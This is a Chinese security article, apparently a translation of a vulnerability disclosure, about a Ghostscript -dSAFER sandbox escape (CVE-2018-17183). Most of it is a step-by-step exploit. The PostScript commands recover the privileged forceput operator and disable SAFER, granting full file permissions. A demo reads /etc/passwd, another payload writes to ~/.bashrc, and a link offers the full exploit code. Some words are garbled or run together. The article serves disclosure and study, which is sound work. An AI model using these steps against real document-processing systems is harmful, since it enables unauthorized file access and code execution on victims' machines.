***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

## 前言

 **今天给大家分析的是一种新型的[ghostscript-dSAFER沙盒逃逸技术](https://bugs.chromium.org/p/project-zero/issues/detail?id=1682)，目前这项技术仍然适用于当前正在使用的所有ghostscript版本。我不知道这个漏洞存在多久了，反正我是觉得已经很久了…**

![aaa.png](https://image.3001.net/images/20181123/1542953390_5bf799ae64530.png!small)

本文提供的漏洞利用代码可以在最新的几个版本中正常运行，如果你想在evince、imagemagick、gimp或okular中查看代码的话，你还需要在~/.bashrc那里添加一行。因为nautilus将在没有任何用户交互的情况下自动调用evice-thumbnailer。如果你想触发这个漏洞的话，你只需要在运行了漏洞利用代码之后随便浏览一个网站就可以了。

    
    
    taviso@ubuntu:~$convert exploit.jpg output.jpg
    
    taviso@ubuntu:~$tail -1 ~/.bashrc
    
    echopwned by postscript

## 背景内容

Postscript的一个核心访问控制功能就是它能够标记可执行代码的运行过程，这样可以防止用户窥视系统程序的执行，并获取更强大的访问操作权限。为此，我专门设计了一个完整的漏洞利用代码，感兴趣的同学可以自行下载测试【[下载地址](https://mailclark.ai/email/attachment/14436/16819467/5644719/-QzIsEjGJ8RkHwQDjtM1DAa2Zoc)】。

当你在[errordict](https://atrey.karlin.mff.cuni.cz/~milanek/PostScript/Reference/PSL2e.html#errordict)中安装了错误处理器之后，如果你终止了一个正在执行的操作进程，这样便会将错误操作符暴露给错误处理器。此时，，rrorerdict便会忽略-dSAFER沙箱，这也就是本文所利用的漏洞[CVE-2018-17183](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-17183)。

### 漏洞利用细节

需要注意的是，这个漏洞目前还没有被完全修复，因为你现在仍然可以调用错误处理器，并触发错误，或者访问内部状态所保存的错误处理器。

其中一种漏洞利用方法为，找到能够终止运行的执行进程，触发一次异常，然后调用错误处理器并终止它的运行（可以通过/stackoverflow或/execoverflow来实现）。当出现故障时，操作码堆栈将会处于一种不一致的状态，因为ghostscript会尝试设置错误处理器，但这种设置是无效的。

### 漏洞利用方式

首先，用垃圾数据填充堆栈，只给错误处理器留下一小部分空间：

    
    
    GS>01 300368 {} for

然后通过修改pdfopdict（改为非字典形式）来让/switch_to_normal_marking_ops发生错误：

    
    
    GS<300369>/pdfopdict null def

调用/switch_to_normal_marking_ops（当前正在执行状态中）：

    
    
    GS<300369>GS_PDF_ProcSet/switch_to_normal_marking_ops get stopped

操作会失败，因为/typecheck正在写入pdfopdict：

    
    
    GS<2>==
    
    True

查看已保存堆栈中的最后几个元素：

    
    
    GS<1>dupdup length 10 sub 10 getinterval ==
    
    [300364300365 300366 300367 300368 null /m {normal_m} --.forceput-- /typecheck]

大家可以看到，错误的操作符已经准备传递给错误处理器了。

其中，forceput是一个非常强大的操作符，它可以忽略所有的访问控制，我们可以把它从堆栈中提取出来，然后用它来做我们想做的事情：

    
    
    systemdict/SAFER false forceput
    
    systemdict/userparams get /PermitFileControl [(*)] forceput
    
    systemdict/userparams get /PermitFileWriting [(*)] forceput
    
    systemdict/userparams get /PermitFileReading [(*)] forceput

结合之前所介绍的内容，我们看一看如何去读取/etc/passwd中的数据，下面给出的是一份DEMO：

    
    
    $ gs-dSAFER -f test.ps 
    
    GPLGhostscript GIT PRERELEASE 9.26 (2018-09-13)
    
    Copyright(C) 2018 Artifex Software, Inc.  Allrights reserved.
    
    Thissoftware comes with NO WARRANTY: see the file PUBLIC for details.
    
    (root:x:0:0:root:/root:/bin/bash)

### 漏洞利用代码

>
> 下载地址：【[点我下载](https://mailclark.ai/email/attachment/14436/16819467/5644719/-QzIsEjGJ8RkHwQDjtM1DAa2Zoc)】

***参考来源：[mailclark](https://mailclark.ai/email/original/16819467/593541/mxzCj2eeqRd2DhZOU0Es1rJVQeg?from_name=Tavis%20Ormandy)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

